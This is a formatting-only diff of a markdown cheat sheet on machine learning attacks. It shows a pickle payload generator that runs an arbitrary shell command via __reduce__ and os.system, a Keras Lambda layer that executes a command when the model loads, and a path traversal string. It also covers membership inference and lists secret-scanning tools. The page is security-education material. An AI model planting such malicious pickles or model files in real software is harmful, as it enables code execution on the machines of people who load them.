@@ -16,7 +16,7 @@ excerpt: Machine Learning Attack
 
 ## Library Attack
 
-### Path Traversal
+### path traversal
 ```
 ../../../../xxx
 ```
@@ -27,15 +27,12 @@ excerpt: Machine Learning Attack
 - create malicious pkl file
 ```python
 import pickle, sys
-
 DEFAULT_COMMAND = 'echo You Are Hacked'
 COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
-
 class PickleRce(object):
     def __reduce__(self):
         import os
         return (os.system,(COMMAND,))
-
 with open("rs.pkl", "wb") as f:
     pickle.dump(PickleRce(), f)
 ```
@@ -77,16 +74,13 @@ numpy.load('rs.pkl', allow_pickle=True)
 ```python
 from keras.layers import Lambda
 from keras.models import Input, Model
-
 a = Input(shape=(2,))
 b = Input(shape=(2,))
-
 def exploit(inputs):
     import os
     os.system('echo "You Are Hacked !!!"')
     x, y = inputs
     return (x + y)
-
 lambda_layer = Lambda(exploit, name="exploit")([a, b])
 model = Model(inputs=[a, b], outputs=[lambda_layer])
 model.save("my_model.h5")
@@ -137,10 +131,10 @@ while current_confidence < 99%
 
 A Membership Inference attack allows the attacker to determine if some input formed part of the training set of the model, simply by exercising the trained model on chosen inputs and observing the result.
 
-- train a number of "Shadow Models"
+- Train a number of "Shadow Models"
 using similar data to the data used to train the Target Model. Note that the attacker doesn’t need to have access to the Target Model’s training data; they simply need to gather data that is similarly distributed and which has a similar structure, i.e. data from the same problem domain.
 
-- train an "Attack Model"
+- Train an "Attack Model"
 A binary classifier with two output classes; "In Training Set" and "Not In Training Set". The Attack Model is trained to recognise the statistical indicators of data that was present in the shadow training set, versus data that was not. Because the Shadow Models and the Target Model were trained on similarly distributed data from the same problem domain, it turns out that the Attack Model is able to recognise these statistical “in/out” indicators in the Target Model with a surprisingly high degree of accuracy.
 
 ### Model Inversion
@@ -162,15 +156,15 @@ A data poisoning backdoor attack on a classifier involves inserting specific ite
 
 ### Credentials in Code
 Finding secret in code:
-- https://github.com/chris-anley/ccs
-- https://github.com/awslabs/git-secrets
-- https://github.com/dxa4481/truffleHog
-- https://github.com/techjacker/repo-security-scanner
-- https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning
+- <https://github.com/chris-anley/ccs>
+- <https://github.com/awslabs/git-secrets>
+- <https://github.com/dxa4481/truffleHog>
+- <https://github.com/techjacker/repo-security-scanner>
+- <https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning>
 
 ### Dependencies
 Third-party libraries may introduces a series of security problems:
-- supplychain attack: https://github.com/ffffffff0x/Dork-Admin
+- supplychain attack: <https://github.com/ffffffff0x/Dork-Admin>
 - vulnerabilities: CVE-2021-32798、CVE-2022-21697、CVE-2022-24758、etc...
 
 ### Web Application Issues
